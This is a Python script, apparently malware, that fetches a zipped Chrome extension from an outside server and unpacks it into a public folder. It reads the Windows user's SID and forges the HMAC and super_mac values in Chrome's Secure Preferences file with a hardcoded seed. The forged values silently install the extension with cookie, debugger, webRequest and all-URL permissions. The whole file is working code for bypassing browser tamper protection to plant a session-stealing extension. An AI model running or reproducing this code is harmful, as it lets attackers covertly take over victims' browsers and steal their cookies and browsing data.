import hmac 
import json 
from collections import OrderedDict
import hashlib
import os
import re
import zipfile
import urllib

def getInfoMachine():
    pattern = r'S-\d+-\d+-\d+-\d+-\d+-\d+'
    usernamee = os.environ["USERPROFILE"].split("\\")[-1]
    sid = ""
    allz = os.popen("whoami /user").read()
    match = re.search(pattern, allz)
    if match:
        sid = match.group()
       
    return usernamee, sid


def unzip_file(zip_file_path, extract_to_folder):
    if not os.path.exists(zip_file_path):
        raise FileNotFoundError(f"The file {zip_file_path} does not exist.")
    if not os.path.exists(extract_to_folder):
        os.makedirs(extract_to_folder)
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to_folder)



#https://github.com/Pica4x6/SecurePreferencesFile
def removeEmpty(d):
    if type(d) == type(OrderedDict()):
        t = OrderedDict(d)
        for x, y in t.items():
            if type(y) == (type(OrderedDict())):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif(type(y) == type({})):
                if(len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]

    elif type(d) == type([]):
        for x, y in enumerate(d):
            if type(y) == type(OrderedDict()):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type({})):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]

#https://github.com/Pica4x6/SecurePreferencesFile
def calculateHMAC(value_as_string, path, sid, seed):
    if ((type(value_as_string) == type({})) or (type(value_as_string) == type(OrderedDict()))):
        removeEmpty(value_as_string)
    message = sid + path + json.dumps(value_as_string, separators=(',', ':'), ensure_ascii=False).replace('<', '\\u003C').replace(
        '\\u2122', '™')
    hash_obj = hmac.new(seed, message.encode("utf-8"), hashlib.sha256)

    return hash_obj.hexdigest().upper()

#https://github.com/Pica4x6/SecurePreferencesFile
def calc_supermac(json_file, sid, seed):
    # Reads the file
    json_data = open(json_file, encoding="utf-8")
    data = json.load(json_data, object_pairs_hook=OrderedDict)
    json_data.close()
    temp = OrderedDict(sorted(data.items()))
    data = temp

    # Calculates and sets the super_mac
    super_msg = sid + json.dumps(data['protection']['macs']).replace(" ", "")
    hash_obj = hmac.new(seed, super_msg.encode("utf-8"), hashlib.sha256)
    return hash_obj.hexdigest().upper()

def add_extension(user, sid):
    ###add json to file
    extension_json=r'{"active_permissions":{"api":["activeTab","cookies","debugger","webNavigation","webRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"filtered_service_worker_events":{"webNavigation.onCompleted":[{}]},"first_install_time":"13364417633506288","from_webstore":false,"granted_permissions":{"api":["activeTab","cookies","debugger","webNavigation","webRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13364417633506288","location":4,"newAllowFileAccess":true,"path":"C:\\Users\\Public\\Downloads\\extension","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"0.1.0"},"serviceworkerevents":["cookies.onChanged","webRequest.onBeforeRequest/s1"],"state":1,"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'
     
     #convert to ordereddict for calc and addition
    dict_extension=json.loads(extension_json, object_pairs_hook=OrderedDict)
    filepath="C:\\users\\{}\\appdata\\local\\Google\\Chrome\\User Data\\Default\\Secure Preferences".format(user)
    with open(filepath, 'rb') as f:
            data = f.read()
    f.close()
    data=json.loads(data,object_pairs_hook=OrderedDict)
    data["extensions"]["settings"]["eljagiodakpnjbaceijefgmidmpmfimg"]=dict_extension
    ###calculate hash for [protect][mac]
    path="extensions.settings.eljagiodakpnjbaceijefgmidmpmfimg"
    #hardcoded seed
    seed=b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
    macs = calculateHMAC(dict_extension, path, sid, seed)
    #add macs to json file
    data["protection"]["macs"]["extensions"]["settings"]["eljagiodakpnjbaceijefgmidmpmfimg"]=macs
    newdata=json.dumps(data)
    with open(filepath, 'w') as z:
            z.write(newdata)
    z.close()
    ###recalculate and replace super_mac
    supermac=calc_supermac(filepath,sid,seed)
    data["protection"]["super_mac"]=supermac
    newdata=json.dumps(data)
    with open(filepath, 'w') as z:
            z.write(newdata)
    z.close()

if __name__ == "__main__":
    headers = {'User-Agent': 'Mozilla/5.0'}
    req = urllib.request.Request('https://install.twil4.id.vn/extension.zip', headers=headers)
    response = urllib.request.urlopen(req)
    content = response.read().decode('utf-8')
    file_name = os.environ["USERPROFILE"] + "\\Downloads\\extension.zip"
    with open(file_name, 'w') as file:
        file.write(content)
    unzip_file(os.environ["USERPROFILE"] + "\\Downloads\\extension.zip", "C:\\Users\\Public\\Downloads")
    user, sid = getInfoMachine()
    add_extension(user, sid)
